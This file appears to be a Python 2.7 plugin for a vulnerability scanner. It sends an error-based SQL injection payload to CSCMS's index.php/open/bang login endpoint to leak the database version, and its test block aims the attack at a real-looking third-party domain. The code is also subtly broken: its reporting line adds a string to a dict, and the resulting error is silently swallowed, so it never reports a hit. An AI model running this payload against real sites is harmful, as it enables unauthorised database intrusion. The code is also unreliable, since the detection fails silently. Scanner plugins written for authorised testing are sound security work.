#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'CSCMS index.php/pen/bang SQL Injection',
	'AUTHOR':'1c3z,wjk',
	'TIME':'20150325',
	'WEB':'',
	'DESCRIPTION':'cscms index.php/open/bang sql injection,sql 报错注入'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'cscms':
			return True
	return False

def Audit(services):
	url = services['url'] +'/index.php/open/bang'
	payload = {'openid':'x','denglu':'login','username':'a%27 and(select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1#','userpass':'bugscan'}
	try:
		rqu =requests.post(url,data=payload)
		if "for key 'group_key'" in rqu.text :
			security_hole('find sql injection: ' + url+payload)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
